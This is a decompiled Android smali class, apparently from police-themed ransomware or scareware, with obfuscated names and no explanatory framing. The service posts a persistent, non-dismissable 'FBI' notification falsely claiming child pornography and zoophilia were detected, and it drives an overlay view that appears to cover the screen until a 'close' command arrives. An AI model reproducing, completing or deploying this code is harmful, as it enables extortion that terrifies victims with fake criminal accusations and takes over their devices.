.class public Lmzmr/iiyma/ssrxp/Jncsdpau;
.super Landroid/app/Service;
.source "Jncsdpau.java"


# instance fields
.field protected cancelNotification:Z

.field protected foreground:Z

.field protected id:I

.field private instance:Lmzmr/iiyma/ssrxp/Jncsdpau;

.field private overlayView:Lmzmr/iiyma/ssrxp/Edncyq;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    const/4 v0, 0x0

    .line 31
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 33
    iput-boolean v0, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->foreground:Z

    .line 34
    iput-boolean v0, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->cancelNotification:Z

    .line 35
    iput v0, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->id:I

    .line 31
    return-void
.end method


# virtual methods
.method protected foregroundNotification(I)Landroid/app/Notification;
    .locals 5
    .param p1, "notificationId"    # I

    .prologue
    .line 45
    new-instance v0, Landroid/app/Notification;

    const/high16 v1, 0x7f020000

    const-string v2, "FBI"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-direct {v0, v1, v2, v3, v4}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    .line 47
    .local v0, "notification":Landroid/app/Notification;
    iget v1, v0, Landroid/app/Notification;->flags:I

    or-int/lit8 v1, v1, 0x2

    or-int/lit8 v1, v1, 0x8

    iput v1, v0, Landroid/app/Notification;->flags:I

    .line 49
    const-string v1, "FBI"

    const-string v2, "Child\u2019s porn and Zoophilia detected"

    const/4 v3, 0x0

    invoke-virtual {v0, p0, v1, v2, v3}, Landroid/app/Notification;->setLatestEventInfo(Landroid/content/Context;Ljava/lang/CharSequence;Ljava/lang/CharSequence;Landroid/app/PendingIntent;)V

    .line 51
    return-object v0
.end method

.method public moveToBackground(I)V
    .locals 1
    .param p1, "id"    # I

    .prologue
    .line 79
    iget-boolean v0, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->cancelNotification:Z

    invoke-virtual {p0, p1, v0}, Lmzmr/iiyma/ssrxp/Jncsdpau;->moveToBackground(IZ)V

    .line 80
    return-void
.end method

.method public moveToBackground(IZ)V
    .locals 1
    .param p1, "id"    # I
    .param p2, "cancelNotification"    # Z

    .prologue
    .line 73
    const/4 v0, 0x0

    iput-boolean v0, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->foreground:Z

    .line 74
    const/4 p1, 0x0

    .line 75
    invoke-super {p0, p2}, Landroid/app/Service;->stopForeground(Z)V

    .line 76
    return-void
.end method

.method public moveToForeground(ILandroid/app/Notification;Z)V
    .locals 1
    .param p1, "id"    # I
    .param p2, "notification"    # Landroid/app/Notification;
    .param p3, "cancelNotification"    # Z

    .prologue
    .line 59
    iget-boolean v0, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->foreground:Z

    if-nez v0, :cond_1

    if-eqz p2, :cond_1

    .line 60
    const/4 v0, 0x1

    iput-boolean v0, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->foreground:Z

    .line 61
    iput p1, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->id:I

    .line 62
    iput-boolean p3, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->cancelNotification:Z

    .line 64
    invoke-super {p0, p1, p2}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    .line 69
    :cond_0
    :goto_0
    return-void

    .line 65
    :cond_1
    iget v0, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->id:I

    if-eq v0, p1, :cond_0

    if-lez p1, :cond_0

    if-eqz p2, :cond_0

    .line 66
    iput p1, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->id:I

    .line 67
    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lmzmr/iiyma/ssrxp/Jncsdpau;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/NotificationManager;

    invoke-virtual {v0, p1, p2}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    goto :goto_0
.end method

.method public moveToForeground(IZ)V
    .locals 1
    .param p1, "id"    # I
    .param p2, "cancelNotification"    # Z

    .prologue
    .line 55
    invoke-virtual {p0, p1}, Lmzmr/iiyma/ssrxp/Jncsdpau;->foregroundNotification(I)Landroid/app/Notification;

    move-result-object v0

    invoke-virtual {p0, p1, v0, p2}, Lmzmr/iiyma/ssrxp/Jncsdpau;->moveToForeground(ILandroid/app/Notification;Z)V

    .line 56
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 118
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 1

    .prologue
    .line 109
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 111
    iput-object p0, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->instance:Lmzmr/iiyma/ssrxp/Jncsdpau;

    .line 113
    new-instance v0, Lmzmr/iiyma/ssrxp/Edncyq;

    invoke-direct {v0, p0}, Lmzmr/iiyma/ssrxp/Edncyq;-><init>(Lmzmr/iiyma/ssrxp/Jncsdpau;)V

    iput-object v0, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->overlayView:Lmzmr/iiyma/ssrxp/Edncyq;

    .line 114
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 5
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    const/4 v4, 0x1

    .line 84
    const/4 v0, 0x0

    .line 85
    .local v0, "extras":Landroid/os/Bundle;
    if-eqz p1, :cond_0

    .line 86
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 88
    :cond_0
    if-eqz v0, :cond_1

    .line 92
    const-string v2, "close"

    invoke-virtual {v0, v2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 93
    .local v1, "value1":Ljava/lang/String;
    if-eqz v1, :cond_1

    .line 95
    iput-boolean v4, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->cancelNotification:Z

    .line 96
    iget v2, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->id:I

    invoke-virtual {p0, v2, v4}, Lmzmr/iiyma/ssrxp/Jncsdpau;->moveToBackground(IZ)V

    .line 97
    const-string v2, "notification"

    invoke-virtual {p0, v2}, Lmzmr/iiyma/ssrxp/Jncsdpau;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/NotificationManager;

    iget v3, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->id:I

    invoke-virtual {v2, v3}, Landroid/app/NotificationManager;->cancel(I)V

    .line 98
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-static {v2}, Landroid/os/Process;->killProcess(I)V

    .line 102
    .end local v1    # "value1":Ljava/lang/String;
    :cond_1
    iget-object v2, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->overlayView:Lmzmr/iiyma/ssrxp/Edncyq;

    if-eqz v2, :cond_2

    .line 103
    iget-object v2, p0, Lmzmr/iiyma/ssrxp/Jncsdpau;->overlayView:Lmzmr/iiyma/ssrxp/Edncyq;

    invoke-virtual {v2}, Lmzmr/iiyma/ssrxp/Edncyq;->refreshLayout()V

    .line 105
    :cond_2
    return v4
.end method
